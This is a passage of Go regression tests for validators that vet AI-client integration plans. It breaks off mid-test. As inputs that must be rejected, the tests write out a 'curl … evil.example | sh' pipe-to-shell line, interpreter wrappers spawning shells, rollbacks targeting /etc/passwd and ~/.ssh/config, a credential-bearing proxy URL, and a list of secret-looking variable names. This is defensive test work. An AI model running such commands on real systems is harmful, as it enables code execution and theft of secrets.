package adapter

// Regression tests for the Sprint 114.0 independent contract review, round 1
// (docs/release/v1.14-s0-review-round1.md). Each test names the finding it
// pins so a future relaxation of a validator is caught with its rationale.

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/myrrazor/atlas-tasker/internal/integrations"
)

const testOpenClaw = "/usr/local/bin/openclaw"

// openclawPlan is a gateway-scope plan whose only client-configuration write
// is a structured register command undone by the client's own remove command.
func openclawPlan(t *testing.T) IntegrationPlan {
	t.Helper()
	reg, err := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingAbsolutePath, WorkspaceRoot: testRoot}, "agent:openclaw-1", false)
	if err != nil {
		t.Fatal(err)
	}
	register := Command{Purpose: CommandPurposeRegister, Executable: testOpenClaw, Args: append([]string{"mcp", "add", reg.ServerName, "--command", reg.Command, "--cwd", testRoot, "--"}, reg.Args...), Dir: testRoot, Timeout: 30 * time.Second}
	unset := Command{Purpose: CommandPurposeRemove, Executable: testOpenClaw, Args: []string{"mcp", "unset", reg.ServerName}, Dir: testRoot, Timeout: 30 * time.Second}
	return IntegrationPlan{
		PlanID: "openclaw-1", ContractVersion: ContractVersion, Operation: PlanOperationSetup, Target: integrations.TargetOpenClaw,
		WorkspaceID: testWorkspaceID, WorkspaceRoot: testRoot, Home: testHome, LocalStateRoot: testStateRoot, Scope: ScopeGateway,
		Detection: Detection{
			Target: integrations.TargetOpenClaw, Installed: true, ExecutablePath: testOpenClaw,
			Version: ClientVersion{Raw: "openclaw 1.4.0", Major: 1, Minor: 4, Known: true}, VersionSupport: VersionSupported,
		},
		Registration: &reg,
		Steps: []PlanStep{
			{StepID: "skill", Kind: StepWriteManagedFile, Description: "write atlas-worker skill", Path: testRoot + "/.agents/skills/atlas-worker/SKILL.md", Reversibility: Reversible, Rollback: &RollbackAction{Kind: RollbackDeleteCreated, Path: testRoot + "/.agents/skills/atlas-worker/SKILL.md"}, Mode: 0o644},
			{StepID: "register", Kind: StepRunClientCommand, Description: "openclaw mcp add", Command: &register, Reversibility: Reversible, Rollback: &RollbackAction{Kind: RollbackRunCommand, Command: &unset}},
		},
		ResultingState: StateConnectedRestartRequired,
		GeneratedAt:    time.Date(2026, 9, 10, 12, 0, 0, 0, time.UTC),
	}
}

func mustReject(t *testing.T, name string, plan IntegrationPlan, want string) {
	t.Helper()
	err := plan.Validate()
	if err == nil {
		t.Fatalf("%s: expected rejection", name)
	}
	if want != "" && !strings.Contains(err.Error(), want) {
		t.Fatalf("%s: error %q does not mention %q", name, err, want)
	}
}

func mustAccept(t *testing.T, name string, plan IntegrationPlan) {
	t.Helper()
	if err := plan.Validate(); err != nil {
		t.Fatalf("%s: unexpected rejection: %v", name, err)
	}
}

// Finding A: the capability cap must order connected above
// connected_restart_required, otherwise OpenClaw's cap does not bind.
func TestOpenClawPlanCannotPromiseConnected(t *testing.T) {
	if stateAtMost(StateConnected, StateConnectedRestartRequired) {
		t.Fatal("connected must rank above connected_restart_required")
	}
	if !stateAtMost(StateConnectedRestartRequired, StateConnected) || !stateAtMost(StateConfiguredUnverified, StateConnectedRestartRequired) || !stateAtMost(StatePortableReady, StateConfiguredUnverified) {
		t.Fatal("lower claims must fit under higher caps")
	}
	plan := openclawPlan(t)
	mustAccept(t, "openclaw at its documented cap", plan)
	plan.ResultingState = StateConnected
	mustReject(t, "openclaw promising connected", plan, "capability cap")
}

// Finding B: a rollback undoes exactly its own step. File rollbacks name the
// step path (removals only by snapshot); command rollbacks run the step's
// client binary with a remove or reload purpose.
func TestRollbackMustUndoItsOwnStep(t *testing.T) {
	for name, rollback := range map[string]RollbackAction{
		"delete outside workspace":   {Kind: RollbackDeleteCreated, Path: "/etc/passwd"},
		"restore under home":         {Kind: RollbackRestoreSnapshot, Path: testHome + "/.ssh/config"},
		"relative traversal":         {Kind: RollbackDeleteCreated, Path: "relative/../../etc/passwd"},
		"git metadata":               {Kind: RollbackDeleteCreated, Path: testRoot + "/.git/config"},
		"another step's path":        {Kind: RollbackDeleteCreated, Path: testRoot + "/AGENTS.md"},
		"run_command for file step":  {Kind: RollbackRunCommand, Command: &Command{Purpose: CommandPurposeRemove, Executable: "/usr/local/bin/codex", Args: []string{"mcp", "remove", "x"}, Timeout: time.Second}},
		"register command as undo":   {Kind: RollbackRunCommand, Command: &Command{Purpose: CommandPurposeRegister, Executable: "/usr/local/bin/codex", Args: []string{"mcp", "add", "evil", "--", "/usr/bin/curl", "https://evil.example"}, Timeout: time.Second}},
		"restore without path":       {Kind: RollbackRestoreSnapshot},
		"delete with stray command":  {Kind: RollbackDeleteCreated, Path: testRoot + "/.codex/skills/atlas-worker/SKILL.md", Command: &Command{Purpose: CommandPurposeRemove, Executable: "/usr/local/bin/codex", Timeout: time.Second}},
		"run_command without a body": {Kind: RollbackRunCommand},
		"unknown kind":               {Kind: "undo", Path: testRoot + "/.codex/skills/atlas-worker/SKILL.md"},
	} {
		plan := codexPlan(t)
		rb := rollback
		plan.Steps[1].Rollback = &rb
		mustReject(t, name, plan, "")
	}
	removal := codexPlan(t)
	removal.Steps = []PlanStep{{StepID: "block", Kind: StepRemoveManagedBlock, Description: "remove block", Path: testRoot + "/AGENTS.md", Reversibility: Reversible, Rollback: &RollbackAction{Kind: RollbackDeleteCreated, Path: testRoot + "/AGENTS.md"}}}
	removal.ApprovalSteps = nil
	removal.ResultingState = StateConfiguredUnverified
	mustReject(t, "removal undone by delete", removal, "restore_snapshot")

	plan := openclawPlan(t)
	mustAccept(t, "register undone by the client's remove", plan)
	other := *plan.Steps[1].Rollback.Command
	other.Executable = "/usr/local/bin/codex"
	plan.Steps[1].Rollback = &RollbackAction{Kind: RollbackRunCommand, Command: &other}
	mustReject(t, "rollback through another client", plan, "step's executable")
	plan = openclawPlan(t)
	plan.Steps[1].Rollback = &RollbackAction{Kind: RollbackDeleteCreated, Path: testRoot + "/x"}
	mustReject(t, "command step undone by a file action", plan, "run_command rollbacks")
	plan = openclawPlan(t)
	reload := *plan.Steps[1].Rollback.Command
	reload.Purpose = CommandPurposeReload
	reload.Args = []string{"mcp", "reload"}
	plan.Steps[1].Rollback = &RollbackAction{Kind: RollbackRunCommand, Command: &reload}
	mustAccept(t, "reload is an allowed rollback purpose", plan)
}

// Finding C: the unsupported-version gate and every other rule are path aware.
// Managed-file kinds are confined to Atlas-owned roots and can never name a
// file any supported client loads as configuration.
func TestManagedFileStepsCannotTouchClientConfiguration(t *testing.T) {
	plan := codexPlan(t)
	plan.Detection.VersionSupport = VersionUnknown
	plan.Detection.Version = ClientVersion{Raw: "codex-cli ?"}
	plan.ApprovalSteps = nil
	plan.ResultingState = StateUnsupportedClientVersion
	plan.Registration = nil
	relabelled := plan.Steps[2]
	relabelled.Kind = StepWriteManagedFile
	relabelled.Scope = ""
	plan.Steps = []PlanStep{plan.Steps[0], plan.Steps[1], relabelled, plan.Steps[4]}
	mustReject(t, "relabelled config write under unsupported version", plan, "client configuration")

	for name, path := range map[string]string{
		"own client config":         testRoot + "/.codex/config.toml",
		"another client's config":   testRoot + "/.cursor/mcp.json",
		"root .mcp.json":            testRoot + "/.mcp.json",
		"grok config":               testRoot + "/.grok/config.toml",
		"arbitrary workspace file":  testRoot + "/README.md",
		"another target's skill":    testRoot + "/.cursor/skills/atlas-worker/SKILL.md",
		"another target's commands": testRoot + "/.claude/commands/atlas-next.md",
		"skill dir itself":          testRoot + "/.codex/skills/atlas-worker",
	} {
		plan := codexPlan(t)
		plan.Steps[1].Path = path
		plan.Steps[1].Rollback.Path = path
		mustReject(t, name, plan, "")
	}
	for name, path := range map[string]string{
		"own skill file":        testRoot + "/.codex/skills/atlas-worker/references/loop.md",
		"generated guide":       testRoot + "/.tracker/integrations/codex-guide.md",
		"codex command prompts": testRoot + "/.tracker/integrations/commands/atlas-next.md",
	} {
		plan := codexPlan(t)
		plan.Steps[1].Path = path
		plan.Steps[1].Rollback.Path = path
		mustAccept(t, name, plan)
	}
	plan = codexPlan(t)
	plan.Steps[0].Path = testRoot + "/CLAUDE.md"
	plan.Steps[0].Rollback.Path = plan.Steps[0].Path
	mustReject(t, "managed block in another target's instruction file", plan, "Atlas-owned")

	claude := codexPlan(t)
	claude.Target = integrations.TargetClaude
	claude.Detection.Target = integrations.TargetClaude
	claude.Detection.ExecutablePath = "/usr/local/bin/claude"
	claude.Scope = ScopeProjectLocal
	claude.ApprovalSteps = nil
	claude.ResultingState = StateConfiguredUnverified
	reg, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingAbsolutePath, WorkspaceRoot: testRoot}, "", false)
	claude.Registration = &reg
	add := Command{Purpose: CommandPurposeRegister, Executable: "/usr/local/bin/claude", Args: append([]string{"mcp", "add", "--scope", "local", "--transport", "stdio", reg.ServerName, "--", reg.Command}, reg.Args...), Dir: testRoot, Timeout: 30 * time.Second}
	remove := Command{Purpose: CommandPurposeRemove, Executable: "/usr/local/bin/claude", Args: []string{"mcp", "remove", "--scope", "local", reg.ServerName}, Dir: testRoot, Timeout: 30 * time.Second}
	claude.Steps = []PlanStep{
		{StepID: "block", Kind: StepUpdateManagedBlock, Description: "refresh block", Path: testRoot + "/CLAUDE.md", Reversibility: Reversible, Rollback: snapshotRollback(testRoot + "/CLAUDE.md"), Mode: 0o644},
		{StepID: "cmd", Kind: StepWriteManagedFile, Description: "command template", Path: testRoot + "/.claude/commands/atlas-next.md", Reversibility: Reversible, Rollback: &RollbackAction{Kind: RollbackDeleteCreated, Path: testRoot + "/.claude/commands/atlas-next.md"}, Mode: 0o644},
		{StepID: "register", Kind: StepRunClientCommand, Description: "claude mcp add", Command: &add, Reversibility: Reversible, Rollback: &RollbackAction{Kind: RollbackRunCommand, Command: &remove}},
	}
	mustAccept(t, "claude plan writing its own instruction file and command dir", claude)

	plan = codexPlan(t)
	plan.Steps[2].Path = testRoot + "/AGENTS.md"
	plan.Steps[2].Rollback.Path = plan.Steps[2].Path
	mustReject(t, "config entry at a non-configuration path", plan, "configuration file")
	plan = codexPlan(t)
	plan.Steps[2].Path = testHome + "/.codex/config.toml"
	plan.Steps[2].Rollback.Path = plan.Steps[2].Path
	mustReject(t, "project_shared plan editing the user file", plan, "")
	plan = codexPlan(t)
	plan.Steps[2].Kind = StepWriteManagedFile
	plan.Steps[2].Scope = ""
	mustReject(t, "config path relabelled under a supported version", plan, "client configuration")
}

// Cursor's user scope is an Atlas-edited file under the home directory: it is
// writable only as a consented root and only at the documented path.
func TestUserScopeConfigEntryNeedsConsentAndTheDocumentedPath(t *testing.T) {
	plan := codexPlan(t)
	plan.Target = integrations.TargetCursor
	plan.Detection.Target = integrations.TargetCursor
	plan.Detection.ExecutablePath = "/usr/local/bin/cursor"
	plan.Scope = ScopeUser
	plan.ApprovalSteps = nil
	plan.ResultingState = StateConfiguredUnverified
	reg, _ := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingAbsolutePath, WorkspaceRoot: testRoot}, "", false)
	plan.Registration = &reg
	plan.ConsentedRoots = []string{testHome + "/.cursor"}
	plan.Steps = []PlanStep{
		{StepID: "block", Kind: StepUpdateManagedBlock, Description: "refresh block", Path: testRoot + "/AGENTS.md", Reversibility: Reversible, Rollback: snapshotRollback(testRoot + "/AGENTS.md"), Mode: 0o644},
		{StepID: "config", Kind: StepWriteConfigEntry, Description: "merge mcpServers entry", Path: testHome + "/.cursor/mcp.json", Scope: ScopeUser, Reversibility: Reversible, Rollback: snapshotRollback(testHome + "/.cursor/mcp.json"), Mode: 0o600},
	}
	mustAccept(t, "user-scope cursor entry in a consented root", plan)
	plan.ConsentedRoots = nil
	mustReject(t, "user file without consent", plan, "consented root")
	plan.ConsentedRoots = []string{testHome + "/.cursor"}
	plan.Steps[1].Path = testHome + "/.cursor/other.json"
	plan.Steps[1].Rollback.Path = plan.Steps[1].Path
	mustReject(t, "user-scope entry at an undocumented file", plan, "configuration file")
	plan.Steps[1].Path = testRoot + "/.cursor/mcp.json"
	plan.Steps[1].Rollback.Path = plan.Steps[1].Path
	mustReject(t, "user-scope plan writing the project file", plan, "configuration file")
}

// The generic target's user-selected destination (AT114-208) is a consented
// root outside the workspace; nothing inside the workspace qualifies.
func TestGenericUserSelectedDestination(t *testing.T) {
	reg, err := NewRegistration(PortableExecutableName, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd}, "", true)
	if err != nil {
		t.Fatal(err)
	}
	plan := IntegrationPlan{
		PlanID: "generic-user", ContractVersion: ContractVersion, Operation: PlanOperationSetup, Target: integrations.TargetGeneric,
		WorkspaceID: testWorkspaceID, WorkspaceRoot: testRoot, Scope: ScopeUser, ConsentedRoots: []string{"/etc/atlas-consented"},
		Detection: Detection{Target: integrations.TargetGeneric, VersionSupport: VersionUnknown}, Registration: &reg,
		Steps: []PlanStep{
			{StepID: "config", Kind: StepWriteConfigEntry, Description: "merge into the user's chosen file", Path: "/etc/atlas-consented/mcp.json", Scope: ScopeUser, Reversibility: Reversible, Rollback: snapshotRollback("/etc/atlas-consented/mcp.json"), Mode: 0o600},
		},
		ResultingState: StateConfiguredUnverified, GeneratedAt: time.Now(),
	}
	mustAccept(t, "generic user-selected destination", plan)
	plan.Steps[0].Path = testRoot + "/custom.json"
	plan.Steps[0].Rollback.Path = plan.Steps[0].Path
	mustReject(t, "user-selected destination inside the workspace", plan, "configuration file")
	plan.Steps[0].Path = "/etc/atlas-consented/mcp.json"
	plan.Steps[0].Rollback.Path = plan.Steps[0].Path
	plan.Scope = ScopeGateway
	mustReject(t, "scope the target does not document", plan, "does not support")
}

// Finding D: Git metadata is never writable and the tracker runtime directory
// admits only its integrations subtree, inside the workspace or anywhere else.
func TestContainmentRejectsGitAndTrackerInternals(t *testing.T) {
	for name, path := range map[string]string{
		"git hook":                  testRoot + "/.git/hooks/post-checkout",
		"nested git dir":            testRoot + "/vendor/.git/config",
		"event log":                 testRoot + "/.tracker/events/2026-09.jsonl",
		"index":                     testRoot + "/.tracker/index.sqlite",
		"managed mode policy":       testRoot + "/.tracker/managed-mode.json",
		"tracker dir itself":        testRoot + "/.tracker",
		"integrations dir itself":   testRoot + "/.tracker/integrations",
		"consented root git":        "/etc/atlas-consented/.git/config",
		"another workspace tracker": "/etc/atlas-consented/.tracker/integrations/x.md",
	} {
		plan := codexPlan(t)
		plan.ConsentedRoots = []string{"/etc/atlas-consented"}
		plan.Steps[1].Path = path
		plan.Steps[1].Rollback = &RollbackAction{Kind: RollbackDeleteCreated, Path: path}
		mustReject(t, name, plan, "")
	}
	plan := codexPlan(t)
	plan.Steps[1].Path = testRoot + "/.tracker/integrations/atlas-mcp.json"
	plan.Steps[1].Rollback = &RollbackAction{Kind: RollbackDeleteCreated, Path: plan.Steps[1].Path}
	mustAccept(t, "integrations subtree", plan)
}

// Finding E: a repository-carried plan with a machine-local executable must
// know the home directory, and PlanInput always carries one.
func TestRepositoryCarriedPlanRequiresHome(t *testing.T) {
	plan := codexPlan(t)
	reg, err := NewRegistration(testHome+"/.local/bin/tracker", testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd}, "agent:codex-1", false)
	if err != nil {
		t.Fatal(err)
	}
	plan.Registration = &reg
	mustReject(t, "home executable with home known", plan, "home directory")
	plan.Home = ""
	mustReject(t, "repository-carried plan without home", plan, "requires home")
	plan = codexPlan(t)
	plan.Home = ""
	mustReject(t, "even a system executable needs home to prove it", plan, "requires home")
	gateway := openclawPlan(t)
	gateway.Home = ""
	mustAccept(t, "machine-local scope does not need home", gateway)

	input := PlanInput{WorkspaceRoot: testRoot, WorkspaceID: testWorkspaceID, TrackerPath: testTracker, Detection: codexDetection()}
	if err := input.Validate(); err == nil || !strings.Contains(err.Error(), "home") {
		t.Fatalf("PlanInput without home must be rejected, got %v", err)
	}
	input.Home = "relative"
	if err := input.Validate(); err == nil {
		t.Fatal("relative home must be rejected")
	}
}

// Finding F: approval steps and pending states imply each other exactly.
func TestApprovalStepsPromiseExactlyTheirPendingState(t *testing.T) {
	for _, state := range []State{StateConfiguredUnverified, StatePendingMCPApproval, StateConnected, StatePortableReady} {
		plan := codexPlan(t)
		plan.ResultingState = state
		mustReject(t, "workspace trust step promising "+string(state), plan, "")
	}
	for _, state := range []State{StatePendingWorkspaceTrust, StatePendingMCPApproval} {
		plan := codexPlan(t)
		plan.ApprovalSteps = nil
		plan.ResultingState = state
		mustReject(t, string(state)+" without an approval step", plan, "requires an approval step")
	}
	plan := codexPlan(t)
	plan.ApprovalSteps = []ApprovalStep{
		{Requirement: ApprovalMCPApproval, Instruction: "Approve the server in Claude Code."},
		{Requirement: ApprovalWorkspaceTrust, Instruction: "Trust the project."},
	}
	plan.ResultingState = StatePendingMCPApproval
	mustReject(t, "trust gate is the earlier state", plan, "pending_workspace_trust")
	plan.ResultingState = StatePendingWorkspaceTrust
	mustAccept(t, "two approvals resolve to workspace trust", plan)
	plan.ApprovalSteps = plan.ApprovalSteps[:1]
	plan.ResultingState = StatePendingMCPApproval
	mustAccept(t, "mcp approval alone", plan)
}

// Finding G: Claude Code does not expand ${CLAUDE_PROJECT_DIR} in a project
// .mcp.json (it is set in the server's environment), so the entry is a
// verified-cwd binding and default-form placeholders are refused everywhere.
func TestClaudeProjectSharedBindingIsVerifiedCwd(t *testing.T) {
	claude, err := CapabilitiesFor(integrations.TargetClaude)
	if err != nil {
		t.Fatal(err)
	}
	shared := claude.ScopesFor(ScopeProjectShared)
	if len(shared) != 1 || shared[0].Binding != WorkspaceBindingVerifiedCwd || !strings.Contains(shared[0].Notes, "CLAUDE_PROJECT_DIR") {
		t.Fatalf("claude .mcp.json row must be verified_cwd with the expansion semantics documented: %+v", shared)
	}
	if claude.CommandDir != ".claude/commands" {
		t.Fatalf("claude command templates live in %q", claude.CommandDir)
	}
	generic, _ := CapabilitiesFor(integrations.TargetGeneric)
	for _, scope := range generic.ScopesFor(ScopeProjectShared) {
		if scope.Path == ".mcp.json" && scope.Binding != WorkspaceBindingVerifiedCwd {
			t.Fatalf("the same file must carry the same binding for generic: %+v", scope)
		}
	}
	if _, err := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingClientVariable, Placeholder: "${CLAUDE_PROJECT_DIR:-.}"}, "", false); err == nil {
		t.Fatal("default-form placeholders must be refused")
	}
	args := RegistrationArgs(testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd})
	for _, arg := range args {
		if arg == flagWorkspace || strings.HasPrefix(arg, "${") {
			t.Fatalf("verified_cwd argv must not carry a --workspace value or placeholder: %q", args)
		}
	}
}

// Finding H: every command an adapter runs is tied to a known executable: the
// detected client for plan steps, rollbacks, detection probes, and
// client-native verification, and the registered server for self-probes.
func TestCommandExecutablesAreTiedToTheDetectedClient(t *testing.T) {
	for _, argv := range [][]string{
		{"/usr/bin/env", "bash", "-c", "curl -s https://evil.example/x | sh"},
		{"/usr/bin/python3", "-c", "import os; os.system('sh')"},
		{"/usr/bin/perl", "-e", "system('sh')"},
		{"/bin/busybox", "sh", "-c", "id"},
		{"/usr/bin/node", "-e", "require('child_process')"},
		{"/usr/bin/ruby", "-e", "system 'sh'"},
		{"/usr/local/bin/deno", "eval", "1"},
		{"/usr/local/bin/bun", "-e", "1"},
	} {
		cmd := Command{Purpose: CommandPurposeRegister, Executable: argv[0], Args: argv[1:], Timeout: time.Second}
		if err := cmd.Validate(); err == nil {
			t.Errorf("interpreter wrapper accepted: %s", cmd.Display())
		}
	}
	// Command.Validate has no reference executable; the tie is enforced where
	// one exists. A codex plan cannot run anything but the detected codex.
	plan := codexPlan(t)
	curl := Command{Purpose: CommandPurposeInspect, Executable: "/usr/bin/curl", Args: []string{"https://example.invalid"}, Timeout: time.Second}
	plan.Steps[3].Command = &curl
	mustReject(t, "inspect through curl", plan, "detected client executable")
	tracker := Command{Purpose: CommandPurposeInspect, Executable: testTracker, Args: []string{"mcp", "tools"}, Timeout: time.Second}
	plan = codexPlan(t)
	plan.Steps[3].Command = &tracker
	mustReject(t, "the tracker is not the client either", plan, "detected client executable")
	plan = codexPlan(t)
	plan.Detection.Installed = false
	plan.Detection.ExecutablePath = ""
	plan.Detection.VersionSupport = VersionUnknown
	plan.Detection.Version.Known = false
	plan.Registration = nil
	plan.ApprovalSteps = nil
	plan.ResultingState = StateConfiguredUnverified
	plan.Steps = []PlanStep{plan.Steps[0], plan.Steps[3]}
	mustReject(t, "command step without a detected client", plan, "detected client executable")

	detection := codexDetection()
	detection.Probes = []ProbeRecord{{Command: Command{Purpose: CommandPurposeDetectVersion, Executable: "/usr/bin/curl", Args: []string{"--version"}, Timeout: time.Second}}}
	if err := detection.Validate(); err == nil {
		t.Fatal("detection probe through another executable must be rejected")
	}
	detection.Probes[0].Command.Executable = detection.ExecutablePath
	if err := detection.Validate(); err != nil {
		t.Fatalf("detection probe through the detected client rejected: %v", err)
	}
	detection.ExecutablePath = ""
	detection.Installed = false
	detection.VersionSupport = VersionUnknown
	detection.Version.Known = false
	if err := detection.Validate(); err == nil {
		t.Fatal("a probe cannot have run when no client executable was found")
	}

	now := time.Now()
	verification := Verification{
		Target: integrations.TargetCodex, State: StateConnected, ConnectionKind: ConnectionKindSelfProbe,
		ClientExecutable: "/usr/local/bin/codex", ServerExecutable: testTracker, CheckedAt: now,
		Checks: []VerificationCheck{{Name: "self_probe.tools_list", Method: VerificationSelfProbe, Passed: true}},
		Probes: []ProbeRecord{
			{Command: Command{Purpose: CommandPurposeProbe, Executable: testTracker, Args: []string{"mcp", "serve"}, Dir: testRoot, Timeout: time.Second}},
			{Command: Command{Purpose: CommandPurposeInspect, Executable: "/usr/local/bin/codex", Args: []string{"mcp", "list"}, Timeout: time.Second}},
		},
	}
	if err := verification.Validate(); err != nil {
		t.Fatalf("well-formed verification rejected: %v", err)
	}
	swapped := verification
	swapped.Probes = []ProbeRecord{{Command: Command{Purpose: CommandPurposeProbe, Executable: "/usr/local/bin/codex", Args: []string{"mcp", "serve"}, Timeout: time.Second}}}
	if err := swapped.Validate(); err == nil {
		t.Fatal("a self-probe must run the registered server executable")
	}
	foreign := verification
	foreign.Probes = []ProbeRecord{{Command: Command{Purpose: CommandPurposeInspect, Executable: "/usr/bin/curl", Args: []string{"x"}, Timeout: time.Second}}}
	if err := foreign.Validate(); err == nil {
		t.Fatal("a client-native check must run the detected client")
	}
	unknown := verification
	unknown.ClientExecutable = ""
	if err := unknown.Validate(); err == nil {
		t.Fatal("probes without a recorded client executable cannot be trusted")
	}
	relative := verification
	relative.ServerExecutable = "tracker"
	if err := relative.Validate(); err == nil {
		t.Fatal("executables in a verification must be absolute")
	}
}

// P3-1: the registry compares the whole capability row, not two fields.
func TestRegistryRejectsAnyMatrixDeviation(t *testing.T) {
	cases := map[string]func(*Capabilities){
		"verification":      func(c *Capabilities) { c.Verification = []VerificationMethod{VerificationManualClientCheck} },
		"mcp apps":          func(c *Capabilities) { c.MCPApps = SupportYes },
		"safe removal":      func(c *Capabilities) { c.SafeRemoval = SupportNo },
		"client executable": func(c *Capabilities) { c.ClientExecutable = "/usr/bin/env" },
		"sources":           func(c *Capabilities) { c.Sources = []string{"https://example.invalid/not-official"} },
		"scope approval":    func(c *Capabilities) { c.Scopes[0].Approval = ApprovalNone },
		"scope restart":     func(c *Capabilities) { c.Scopes[0].Restart = RestartUnverified },
		"scope binding":     func(c *Capabilities) { c.Scopes[0].Binding = WorkspaceBindingClientVariable },
		"also loads":        func(c *Capabilities) { c.AlsoLoads = []string{".mcp.json"} },
		"version args":      func(c *Capabilities) { c.VersionArgs = []string{"-V"} },
		"unverified list":   func(c *Capabilities) { c.Unverified = nil },
		"instruction file":  func(c *Capabilities) { c.InstructionFile = "CLAUDE.md" },
		"skill dir":         func(c *Capabilities) { c.SkillDir = ".agents/skills/atlas-worker" },
		"command dir":       func(c *Capabilities) { c.CommandDir = ".codex/commands" },
		"mcp support":       func(c *Capabilities) { c.MCPSupport = MCPSupportClientCLI },
		"display name":      func(c *Capabilities) { c.DisplayName = "Codex CLI" },
		"version policy":    func(c *Capabilities) { c.VersionPolicy = "anything goes" },
	}
	for name, mutate := range cases {
		fake := newFakeAdapter(t, integrations.TargetCodex)
		fake.caps.Scopes = append([]ScopeCapability(nil), fake.caps.Scopes...)
		mutate(&fake.caps)
		err := NewRegistry().Register(fake)
		if err == nil || !strings.Contains(err.Error(), "disagrees with the capability matrix") {
			t.Errorf("%s: expected matrix disagreement, got %v", name, err)
		}
	}
}

// P3-2: environment values are screened for credential URLs and the name
// guard covers the common secret spellings without refusing PATH.
func TestCommandEnvScreening(t *testing.T) {
	base := func() Command {
		return Command{Purpose: CommandPurposeInspect, Executable: "/usr/local/bin/codex", Args: []string{"mcp", "list"}, Timeout: time.Second}
	}
	cmd := base()
	cmd.Env = []EnvVar{{Name: "HTTPS_PROXY", Value: "https://alice:hunter2@proxy.example:8080"}}
	if err := cmd.Validate(); err == nil || !strings.Contains(err.Error(), "credentials") {
		t.Fatalf("credential URL in an env value must be refused, got %v", err)
	}
	for _, name := range []string{"AUTH_HEADER", "OPENAI_KEY", "GH_PAT", "GITHUB_PAT", "BEARER", "COOKIE", "SESSION_ID", "PASS", "PASSWORD", "MY_SECRET", "X_TOKEN", "AWS_CREDENTIAL_FILE"} {
		cmd := base()
		cmd.Env = []EnvVar{{Name: name, Value: "x"}}
		if err := cmd.Validate(); err == nil {
			t.Errorf("%s must be refused as a secret-looking name", name)
		}
	}
	for _, name := range []string{"HOME", "PATH", "XDG_CONFIG_HOME", "LANG", "NO_COLOR", "CODEX_HOME", "TMPDIR", "TERM"} {
		cmd := base()
		cmd.Env = []EnvVar{{Name: name, Value: "/tmp/fake"}}
		if err := cmd.Validate(); err != nil {
			t.Errorf("%s is an ordinary variable and must be accepted: %v", name, err)
		}
	}
}

// P3-3: the shared JSON entry keeps the keys Atlas does not own, so a
// user-edited Atlas entry is distinguishable from a pristine one.
func TestStandardServerEntryDetectsForeignKeys(t *testing.T) {
	reg, err := NewRegistration(testTracker, testWorkspaceID, WorkspaceBinding{Kind: WorkspaceBindingVerifiedCwd}, "", false)
	if err != nil {
		t.Fatal(err)
	}
	pristine, err := reg.StandardConfigJSON()
	if err != nil {
		t.Fatal(err)
	}
	var cfg StandardConfig
	if err := json.Unmarshal(pristine, &cfg); err != nil {
		t.Fatal(err)
	}
	entry := cfg.MCPServers[reg.ServerName]
	if !entry.Matches(reg) || len(entry.ForeignKeys()) != 0 {
		t.Fatalf("pristine entry must match its registration: %+v", entry)
	}
	var doc map[string]map[string]map[string]any
	if err := json.Unmarshal(pristine, &doc); err != nil {
		t.Fatal(err)
	}
	doc["mcpServers"][reg.ServerName]["env"] = map[string]string{"HTTPS_PROXY": "https://alice:hunter2@proxy.example/"}
	doc["mcpServers"][reg.ServerName]["cwd"] = "/somewhere/else"
	edited, _ := json.Marshal(doc)
	var back StandardConfig
	if err := json.Unmarshal(edited, &back); err != nil {
		t.Fatal(err)
	}
	got := back.MCPServers[reg.ServerName]
	if !reflect.DeepEqual(got.ForeignKeys(), []string{"cwd", "env"}) {
		t.Fatalf("foreign keys = %v", got.ForeignKeys())
	}
	if got.Matches(reg) {
		t.Fatal("an entry with user-added keys is no longer byte-for-byte Atlas owned")
	}
	reencoded, _ := json.Marshal(got)
	if strings.Contains(string(reencoded), "hunter2") || strings.Contains(string(reencoded), `"cwd":`) || strings.Contains(string(reencoded), `"env":`) {
		t.Fatalf("foreign keys must never be re-encoded by Atlas: %s", reencoded)
	}
	changedType := entry
	changedType.Type = "http"
	if changedType.Matches(reg) {
		t.Fatal("a changed transport type is a user edit")
	}
	changedArgs := entry
	changedArgs.Args = append([]string(nil), entry.Args...)
	changedArgs.Args[len(changedArgs.Args)-1] = "1"
	if changedArgs.Matches(reg) {
		t.Fatal("a changed argument is a user edit")
	}
	if err := json.Unmarshal([]byte(`{"type":"stdio","command":5,"args":[]}`), &entry); err == nil {
		t.Fatal("a mistyped owned key must be a decode error")
	}
}

// P3-4: verification is not capped by the plan-time capability cap (an
// OpenClaw gateway that was reloaded and probed live is connected), but the
// connection kind must match the target class and be backed by evidence of
// its own methods.
func TestVerificationKindMustBeBackedByEvidence(t *testing.T) {
	now := time.Now()
	openclaw := Verification{
		Target: integrations.TargetOpenClaw, State: StateConnected, ConnectionKind: ConnectionKindClientNative,
		ClientExecutable: testOpenClaw, CheckedAt: now,
		Checks: []VerificationCheck{{Name: "openclaw mcp doctor --probe", Method: VerificationClientCLIDoctor, Passed: true}},
	}
	if err := openclaw.Validate(); err != nil {
		t.Fatalf("a live doctor probe proves connected regardless of the plan cap: %v", err)
	}
	codexGeneric := Verification{Target: integrations.TargetCodex, State: StateConnected, ConnectionKind: ConnectionKindStandardConfig, CheckedAt: now,
		Checks: []VerificationCheck{{Name: "conformance", Method: VerificationConformanceHost, Passed: true}}}
	if err := codexGeneric.Validate(); err == nil {
		t.Fatal("a named client cannot report a generic connection kind")
	}
	unbacked := openclaw
	unbacked.Checks = []VerificationCheck{{Name: "self_probe", Method: VerificationSelfProbe, Passed: true}}
	if err := unbacked.Validate(); err == nil {
		t.Fatal("client_native needs a passed client-native check, not a self-probe")
	}
	selfProbe := openclaw
	selfProbe.ConnectionKind = ConnectionKindSelfProbe
	if err := selfProbe.Validate(); err == nil {
		t.Fatal("self_probe needs a passed self-probe check, not a client-native one")
	}
	custom := Verification{Target: integrations.TargetGeneric, State: StateConnected, ConnectionKind: ConnectionKindCustomAdapter, CheckedAt: now,
		Checks: []VerificationCheck{{Name: "self_probe", Method: VerificationSelfProbe, Passed: true}}}
	if err := custom.Validate(); err == nil {
		t.Fatal("generic kinds are proven by the conformance host only")
	}
